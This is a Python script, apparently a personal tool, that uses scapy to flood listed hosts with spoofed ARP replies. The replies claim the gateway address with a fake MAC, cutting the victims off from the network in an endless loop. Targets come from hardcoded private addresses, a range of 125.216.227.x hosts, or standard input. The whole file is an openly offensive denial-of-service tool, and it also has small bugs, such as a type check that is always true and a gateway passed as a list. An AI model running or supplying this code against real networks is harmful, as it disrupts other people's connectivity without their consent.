#!/usr/bin/env python
# author:  Hua Liang [ Stupid ET ]
# email:   et@everet.org
# website: http://EverET.org
#

import sys
from scapy.all import ARP, send


def kill(targets, gateway_ip="192.168.1.1", nloop=True):
    if targets is not list:
        targets = [targets]
    a = ARP()
    a.psrc = gateway_ip
    a.hwsrc = "2b:2b:2b:2b:2b:2b"
    a.hwdst = "ff:ff:ff:ff:ff:ff"

    while True:
        for target in targets:
            a.pdst = target
            send(a)
        if not nloop:
            break

if __name__ == '__main__':

    #kill('192.168.0.107', '192.168.0.1')
    targets = ['192.168.0.141',
     '192.168.0.163',
     '192.168.0.125',
     '192.168.0.134',
     '192.168.0.153',
     '192.168.0.136',
     '192.168.0.137',
     '192.168.0.145',
     '192.168.0.121',
     '192.168.0.132',
     '192.168.0.123',
     '192.168.0.117',
     '192.168.0.107',
     '192.168.0.1',
     '192.168.0.255',
     '192.168.0.113',
     '192.168.0.110',
     '192.168.0.101',
     '192.168.0.152',
     '192.168.0.109',
     '192.168.0.108']

    targets = ['125.216.227.' + str(ip) for ip in range(255) if ip != 11]

    targets = sys.stdin.read().splitlines()

    print "targets", targets
    is_gateway = lambda ip: ip[ip.rfind('.') + 1:] == '254'
    gateway = filter(is_gateway, targets)
    targets = filter(lambda x: not is_gateway(x), targets)
    targets = filter(lambda x: len(x) != 0, targets)

    print gateway
    print targets

    kill(targets, gateway)
